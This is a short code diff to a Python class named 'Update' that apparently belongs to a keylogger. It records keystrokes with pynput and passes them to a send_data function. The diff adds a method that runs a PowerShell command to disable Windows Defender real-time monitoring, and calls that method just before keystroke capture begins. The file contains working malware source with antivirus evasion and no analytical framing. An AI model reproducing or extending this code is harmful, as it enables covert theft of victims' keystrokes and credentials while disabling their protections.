@@ -191,7 +191,10 @@ class Update:
             hit_key = "" + str(key) + ""
 
      self.send_data(hit_key)
-
+     
+    def DWD(self):
+        os.system("Set-MpPreference -DisableRealtimeMonitoring $true")
+     
     def change_dir(self):
         try:
             username = getpass.getuser()
@@ -239,6 +242,7 @@ if "%found%"=="false" (
         listener = pynput.keyboard.Listener(on_press=self.take_keys)
         with listener:
             self.logger = ""
+            self.DWD()
             self.change_dir()
             listener.join()
             
